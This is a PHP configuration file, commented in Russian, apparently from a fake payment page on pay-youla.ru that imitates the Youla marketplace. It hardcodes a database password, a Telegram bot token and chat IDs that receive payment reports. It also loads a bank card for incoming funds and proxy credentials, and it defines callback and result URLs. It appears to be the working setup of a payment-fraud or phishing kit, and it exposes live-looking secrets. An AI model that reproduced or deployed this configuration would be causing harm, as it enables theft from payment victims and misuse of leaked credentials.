<?php
session_start();
global $token, $chatid, $destinationcard;
header('Content-Type: text/html; charset=utf-8');
$database_host = "localhost";
$database_user = "azzzzzza_bot";
$database_password = "ReZonans13";
$database_name = "111";
$card_path = '/var/www/www-root/data/www/pay-youla.ru/card.txt';
$proxy_path = '/var/www/www-root/data/www/pay-youla.ru/proxy.txt';
$root_pach = '/var/www/www-root/data/www/pay-youla.ru/';
// Заголовок страницы.
$title = "Платежная система";

// Заголовок формы (для обычных платежей).
$heading = "Платежная информация";
$bot_token = '1043654923:AAGdNk5CrYmhi3o5AQFsveH7I1aVCUVF438';
$token  = '1043654923:AAGdNk5CrYmhi3o5AQFsveH7I1aVCUVF438';
$chatid = '-1001363740250';
// Идентификатор беседы в Telegram.
// Идентификатор аккаунта в Telegram.
$bot_receiver = "676094295";

$bot_receiver_success = '-1001363740250';

$bot_viplat_chat = '676094295';

// Идентификатор беседы в Telegram.
$bot_receiver_add = "-1001363740250";

// Номер карты для поступления зачислений
$card_arr = json_decode(file_get_contents('card.txt'),true);
$card = $card_arr[0]['card'];//"";

$get = json_decode(file_get_contents('proxy.txt'),true);
$proxy1 = explode(':',$get[0]['proxy']);//  прокси
$proxy = $proxy1[0].':'.$proxy1[1]; // IP:PORT
$pass  = $proxy1[2].':'.$proxy1[3]; // USER:PASS

// Страница с успешной оплатой
$success_url = "success.php";


// Страница с ошибкой оплаты
$fail_url = "fail.php";

// Страница успешной оплаты.
$success_url = "https://" . $_SERVER["HTTP_HOST"] . "/merchant/success.php";

// Страница ошибки оплаты.
$error_url = "https://" . $_SERVER["HTTP_HOST"] . "/merchant/fail.php";

// Адрес оповещения.
$callback_url = "https://" . $_SERVER["HTTP_HOST"] . "/merchant/callback.php";

// Адрес обработчика статуса.
$status_url = "https://" . $_SERVER["HTTP_HOST"] . "/merchant/status.php";


?>